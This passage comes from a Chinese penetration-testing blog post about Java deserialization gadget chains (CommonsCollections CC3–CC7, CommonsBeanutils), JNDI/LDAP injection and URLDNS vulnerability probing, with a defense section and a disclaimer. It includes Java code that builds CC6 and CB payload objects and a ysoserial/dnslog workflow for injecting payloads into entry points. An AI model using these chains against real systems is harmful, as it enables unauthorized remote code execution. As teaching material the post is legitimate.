+<h3 id="3-4-CC3-—-字节码加载路径"><a href="#3-4-CC3-—-字节码加载路径" class="headerlink" title="3.4 CC3 — 字节码加载路径"></a>3.4 CC3 — 字节码加载路径</h3><p>CC3在CC1基础上，将直接反射调用<code>Runtime.exec()</code>替换为加载恶意<code>TemplatesImpl</code>字节码。这种方式在JDK高版本中能绕过对<code>Runtime.class</code>的反射限制。</p>
+<p>关键差异：<code>ConstantTransformer</code>返回<code>TrAXFilter.class</code>，通过<code>InstantiateTransformer</code>实例化它，而<code>TrAXFilter</code>的构造方法接受<code>Templates</code>对象并自动调用<code>newTransformer()</code>，触发字节码执行。</p>
+<h3 id="3-5-CC5-—-BadAttributeValueExpException入口"><a href="#3-5-CC5-—-BadAttributeValueExpException入口" class="headerlink" title="3.5 CC5 — BadAttributeValueExpException入口"></a>3.5 CC5 — BadAttributeValueExpException入口</h3><p>CC5使用<code>javax.management.BadAttributeValueExpException.readObject()</code>作为入口。该类在<code>readObject()</code>中会调用<code>toString()</code>，进而触发<code>TiedMapEntry.toString() -&gt; getValue() -&gt; LazyMap.get()</code>。不依赖<code>AnnotationInvocationHandler</code>，兼容JDK 8u71+。</p>
+<h3 id="3-6-CC6-—-高版本JDK通用链"><a href="#3-6-CC6-—-高版本JDK通用链" class="headerlink" title="3.6 CC6 — 高版本JDK通用链"></a>3.6 CC6 — 高版本JDK通用链</h3><p>CC6是目前实际渗透中使用最广泛的链之一。它以<code>HashSet.readObject()</code>为入口，利用<code>HashMap.hashCode()</code>触发<code>TiedMapEntry.hashCode() -&gt; getValue() -&gt; LazyMap.get()</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CC6核心构造</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">set.add(entry);</span><br><span class="line">lazyMap.clear(); <span class="comment">// 确保反序列化时重新触发get()</span></span><br><span class="line"><span class="comment">// 构造完成，HashSet序列化数据即为Payload</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>CC6调用路径</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject() -&gt; HashMap.put() -&gt; HashMap.hash()</span><br><span class="line">  -&gt; TiedMapEntry.hashCode() -&gt; TiedMapEntry.getValue()</span><br><span class="line">    -&gt; LazyMap.get() -&gt; ChainedTransformer.transform() -&gt; exec()</span><br></pre></td></tr></table></figure>
+
+<p>CC6的优势在于不受JDK版本<code>AnnotationInvocationHandler</code>限制影响，在JDK 7和JDK 8所有版本上均可用。</p>
+<h3 id="3-7-CC7-—-Hashtable哈希碰撞链"><a href="#3-7-CC7-—-Hashtable哈希碰撞链" class="headerlink" title="3.7 CC7 — Hashtable哈希碰撞链"></a>3.7 CC7 — Hashtable哈希碰撞链</h3><p>CC7利用<code>Hashtable.readObject()</code>中的<code>reconstitutionPut</code>逻辑，通过构造两个哈希值相同但<code>equals()</code>返回false的key，触发<code>LazyMap.get()</code>。这是CC系列中最后一个有代表性的变体，适用场景与CC6互补。</p>
+<h2 id="四、CommonsBeanutils（CB）链"><a href="#四、CommonsBeanutils（CB）链" class="headerlink" title="四、CommonsBeanutils（CB）链"></a>四、CommonsBeanutils（CB）链</h2><p>CB链不需要CommonsCollections依赖，只要目标应用存在<code>commons-beanutils</code>即可利用。核心是<code>BeanComparator</code>类——它实现了<code>Comparator</code>和<code>Serializable</code>，其<code>compare()</code>方法会调用<code>PropertyUtils.getProperty()</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CB链构造</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">evilTemplates</span> <span class="operator">=</span> ...; <span class="comment">// 包含恶意字节码的TemplatesImpl</span></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>); queue.add(<span class="number">1</span>); <span class="comment">// 先填充无害值，避免构造时触发</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射替换为恶意对象</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] array = (Object[]) field.get(queue);</span><br><span class="line">array[<span class="number">0</span>] = evilTemplates;</span><br></pre></td></tr></table></figure>
+
+<p><strong>CB链调用路径</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject() -&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">  -&gt; BeanComparator.compare() -&gt; PropertyUtils.getProperty()</span><br><span class="line">    -&gt; TemplatesImpl.getOutputProperties() -&gt; newTransformer()</span><br><span class="line">      -&gt; 恶意字节码中的静态/构造代码块 -&gt; Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>CB链的优势在于适用范围更广——不依赖CommonsCollections，且在JDK 11+部分版本上仍可用。</p>
+<h2 id="五、JNDI-LDAP-注入"><a href="#五、JNDI-LDAP-注入" class="headerlink" title="五、JNDI + LDAP 注入"></a>五、JNDI + LDAP 注入</h2><h3 id="5-1-JNDI注入基础"><a href="#5-1-JNDI注入基础" class="headerlink" title="5.1 JNDI注入基础"></a>5.1 JNDI注入基础</h3><p>JNDI是Java的命名与目录服务接口。当<code>InitialContext.lookup()</code>的参数可控时，攻击者可令客户端连接恶意LDAP&#x2F;RMI服务器加载远程恶意类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 危险代码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;uri&quot;</span>);</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">ctx.lookup(uri); <span class="comment">// 若uri指向恶意LDAP服务器，可导致远程类加载</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-与反序列化的联合攻击"><a href="#5-2-与反序列化的联合攻击" class="headerlink" title="5.2 与反序列化的联合攻击"></a>5.2 与反序列化的联合攻击</h3><p><strong>出网场景</strong>（目标可连接外部LDAP服务器）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者LDAP服务器 -&gt; 返回Reference -&gt; 指向HTTP上的恶意.class -&gt; 目标加载执行</span><br></pre></td></tr></table></figure>
+
+<p><strong>不出网场景</strong>（高版本JDK限制了远程Codebase加载）：</p>
+<p>攻击者搭建LDAP服务器，在返回的Reference中嵌入序列化Payload。当客户端<code>lookup()</code>时，JNDI实现内部会反序列化该对象，触发Gadget Chain。这就是”JNDI + 反序列化”联合攻击。</p>
+<h3 id="5-3-高版本JDK限制"><a href="#5-3-高版本JDK限制" class="headerlink" title="5.3 高版本JDK限制"></a>5.3 高版本JDK限制</h3><ul>
+<li>JDK 8u121+：<code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认false</li>
+<li>JDK 8u191+：<code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认false</li>
+<li>JDK 11.0.1+：进一步收紧</li>
+</ul>
+<p>但即使无法远程加载字节码，只要目标classpath中存在可用的本地Gadget Class，通过JNDI返回序列化数据仍可能成功利用。</p>
+<h2 id="六、URLDNS-—-无副作用探测"><a href="#六、URLDNS-—-无副作用探测" class="headerlink" title="六、URLDNS — 无副作用探测"></a>六、URLDNS — 无副作用探测</h2><h3 id="6-1-原理"><a href="#6-1-原理" class="headerlink" title="6.1 原理"></a>6.1 原理</h3><p>URLDNS是ysoserial中最特殊的链：它不执行代码，仅触发一次DNS查询。利用<code>HashMap.readObject()</code>反序列化时对key调用<code>hashCode()</code>，而<code>URL.hashCode()</code>需通过<code>InetAddress.getByName()</code>解析域名，自然地发起DNS请求。</p>
+<p><strong>调用链</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; putVal() -&gt; hash()</span><br><span class="line">  -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode()</span><br><span class="line">    -&gt; getHostAddress() -&gt; InetAddress.getByName() -&gt; DNS查询</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-手工构造"><a href="#6-2-手工构造" class="headerlink" title="6.2 手工构造"></a>6.2 手工构造</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">generateURLDNS</span><span class="params">(String dnslogUrl)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(dnslogUrl);</span><br><span class="line">    HashMap&lt;URL, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    f.set(url, -<span class="number">1</span>); <span class="comment">// put时不触发DNS</span></span><br><span class="line"></span><br><span class="line">    map.put(url, <span class="number">0</span>);</span><br><span class="line">    f.set(url, -<span class="number">1</span>); <span class="comment">// 重置，确保反序列化时重新触发DNS</span></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-实战流程"><a href="#6-3-实战流程" class="headerlink" title="6.3 实战流程"></a>6.3 实战流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 申请DNSLog平台临时域名 (如 abc.dnslog.cn)</span><br><span class="line">       |</span><br><span class="line">2. 生成Payload: java -jar ysoserial.jar URLDNS &quot;http://abc.dnslog.cn&quot;</span><br><span class="line">       |</span><br><span class="line">3. 将Payload注入全部可疑的反序列化入口 (HTTP参数/Cookie/Base64)</span><br><span class="line">       |</span><br><span class="line">4. 查看DNSLog平台是否收到查询</span><br><span class="line">       |</span><br><span class="line">5. 收到 -&gt; 确认漏洞存在 -&gt; 进一步构造利用链</span><br><span class="line">   未收到 -&gt; 不代表安全, 可能因防火墙/DNS限制</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-4-URLDNS优势"><a href="#6-4-URLDNS优势" class="headerlink" title="6.4 URLDNS优势"></a>6.4 URLDNS优势</h3><ul>
+<li>纯JDK原生类，无需任何第三方依赖</li>
+<li>不执行命令，不留下系统日志</li>
+<li>DNS查询通常不被防火墙拦截</li>
+<li>适合大规模自动化扫描</li>
+</ul>
+<h2 id="七、防御与修复"><a href="#七、防御与修复" class="headerlink" title="七、防御与修复"></a>七、防御与修复</h2><h3 id="开发侧"><a href="#开发侧" class="headerlink" title="开发侧"></a>开发侧</h3><ol>
+<li><strong>类白名单过滤</strong>：JDK 9+使用<code>ObjectInputFilter</code>限制可反序列化的类：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> ObjectInputFilter.Config.createFilter(</span><br><span class="line">    <span class="string">&quot;java.lang.*;java.util.*;com.myapp.*;!*&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">ois.setObjectInputFilter(filter);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p><strong>避免使用Java原生序列化</strong>：优先使用JSON、Protobuf等格式。</p>
+</li>
+<li><p><strong>依赖升级</strong>：确保CommonsCollections、commons-beanutils等为安全版本。</p>
+</li>
+<li><p><strong>代码审计</strong>：排查所有<code>readObject()</code>、<code>readUnshared()</code>调用点。</p>
+</li>
+</ol>
+<h3 id="运维侧"><a href="#运维侧" class="headerlink" title="运维侧"></a>运维侧</h3><ol>
+<li><strong>WAF规则</strong>：检测Java序列化魔数<code>0xACED</code>（Base64特征：<code>rO0</code>）。</li>
+<li><strong>RASP运行时防护</strong>：监控<code>Runtime.exec()</code>等系统调用。</li>
+<li><strong>最小权限</strong>：Java进程不应具有执行系统命令的权限。</li>
+</ol>
+<h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><ul>
+<li>反序列化漏洞核心：<code>readObject()</code>对不可信数据的自动递归处理</li>
+<li>ysoserial集成了CC1-CC7、CB、URLDNS等大量Gadget Chain</li>
+<li>CC1&#x2F;CC3依赖AnnotationInvocationHandler，CC2&#x2F;CC4基于PriorityQueue</li>
+<li>CC5&#x2F;CC6&#x2F;CC7通过不同入口（BadAttributeValueExpException &#x2F; HashSet &#x2F; Hashtable）适配不同JDK版本</li>
+<li>CB链不依赖CC库，通过BeanComparator触发TemplatesImpl</li>
+<li>JNDI+LDAP可结合反序列化，实现远程类加载或本地Gadget触发</li>
+<li>URLDNS是无副作用的探测首选，利用DNS查询确认漏洞</li>
+<li>防御需从代码白名单、运行时监控、网络层检测三个维度同步进行</li>
+</ul>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><blockquote>
+<p><strong>本文仅供安全研究与教学目的使用。</strong> 文中涉及的技术仅供合法的渗透测试、安全评估和学习交流。任何人不得利用本文所述技术进行未授权的入侵、攻击或破坏。因不当使用造成的一切后果由使用者自行承担，作者概不负责。安全测试前请务必获得目标系统的明确书面授权。</p>
+</blockquote>
+<hr>
+<p><em>参考项目：</em></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html">Java Object Serialization Specification</a></li>
+<li>FoxGlove Security — <em>Marshalling Pickles</em></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" rel="tag"># 框架安全</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Crypto-common-algorithms/" rel="prev" title="渗透测试中的密码学：常见加密算法识别">
+                  <i class="fa fa-angle-left"></i> 渗透测试中的密码学：常见加密算法识别
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Database-Redis-security/" rel="next" title="Redis安全攻击面">
+                  Redis安全攻击面 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
